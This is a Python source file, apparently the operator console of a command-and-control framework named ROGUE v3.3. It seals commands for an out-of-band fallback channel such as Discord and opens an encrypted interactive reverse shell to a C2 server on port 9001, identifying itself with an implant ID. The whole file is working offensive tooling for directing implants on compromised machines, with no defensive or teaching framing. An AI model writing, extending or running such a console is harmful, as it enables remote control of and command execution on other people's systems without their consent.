#!/usr/bin/env python3
"""
ROGUE v3.3 operator console
============================
Small operator-side tools that speak the v2 protocol:

  * seal an OOB command for the fallback channel:
        python3 scripts/rogue_op.py seal --secret <hex> "uname -a"
        -> paste the printed frame into the OOB channel (discord etc.)
  * encrypted reverse shell into the C2 (port 9001):
        python3 scripts/rogue_op.py shell --secret <hex> --pub <b64> HOST

Both require the operator secret; shell also needs the C2 static public key
(rogue_keys/static_pub.b64). Run from the repo root so rogue_v2_core.py
imports resolve.
"""
import argparse
import base64
import os
import socket
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from rogue_v2_core import (  # noqa: E402
    RogueV2Client, rv2_frame_recv, rv2_frame_send, rv2_oob_seal,
)


def _secret(v):
    try:
        return bytes.fromhex(v) if len(v) % 2 == 0 and all(c in "0123456789abcdefABCDEF" for c in v) else v.encode()
    except Exception:
        return v.encode()


def cmd_seal(args):
    frame = rv2_oob_seal(args.secret, {"o": args.command})
    print(frame)


def cmd_shell(args):
    if not args.pub:
        pub_path = os.path.join(args.dir or "rogue_keys", "static_pub.b64")
        if os.path.exists(pub_path):
            args.pub = open(pub_path).read().strip()
    if not args.pub:
        print("[!] need --pub (C2 static public key)")
        sys.exit(1)
    host, _, port_s = args.host.partition(":")
    port = int(port_s or 9001)

    client = RogueV2Client(args.secret, args.pub, implant_id="operator_%d" % os.getpid())
    s = socket.create_connection((host, port), timeout=15)
    try:
        rv2_frame_send(s, client.build_hello())
        ack_raw = rv2_frame_recv(s)
        client.handle_hello_ack(ack_raw)
        print("[+] encrypted shell to %s:%d - type 'exit' to quit" % (host, port))
        import select
        import time
        s.setblocking(False)
        buf = b""
        while True:
            ready, _, _ = select.select([s], [], [], 0.2)
            if ready:
                try:
                    wire = rv2_frame_recv(s)
                except Exception:
                    break
                if wire is None:
                    print("\n[!] connection closed")
                    break
                try:
                    inner = client.open_op(wire)
                    sys.stdout.write(inner.get("o", "") + "\n")
                    sys.stdout.flush()
                except Exception as e:
                    print("\n[!] frame error: %s" % e)
            r, _, _ = select.select([sys.stdin], [], [], 0)
            if r:
                line = sys.stdin.readline()
                if not line:
                    break
                line = line.rstrip("\n")
                if line in ("exit", "quit"):
                    break
                rv2_frame_send(s, client.seal_op({"o": line}))
    finally:
        s.close()


def main():
    ap = argparse.ArgumentParser(description="ROGUE v3.3 operator console")
    sub = ap.add_subparsers(dest="mode", required=True)

    p1 = sub.add_parser("seal", help="seal an OOB command frame (paste into channel)")
    p1.add_argument("--secret", required=True, help="operator secret (hex)")
    p1.add_argument("command", help="command to seal")
    p1.set_defaults(fn=cmd_seal)

    p2 = sub.add_parser("shell", help="encrypted reverse shell client (C2 port 9001)")
    p2.add_argument("--secret", required=True, help="operator secret (hex)")
    p2.add_argument("--pub", default="", help="C2 static public key b64 (or --dir)")
    p2.add_argument("--dir", default="rogue_keys", help="key dir fallback for pub key")
    p2.add_argument("host", help="C2 host[:port] (default port 9001)")
    p2.set_defaults(fn=cmd_shell)

    args = ap.parse_args()
    args.secret = _secret(args.secret)
    args.fn(args)


if __name__ == "__main__":
    main()
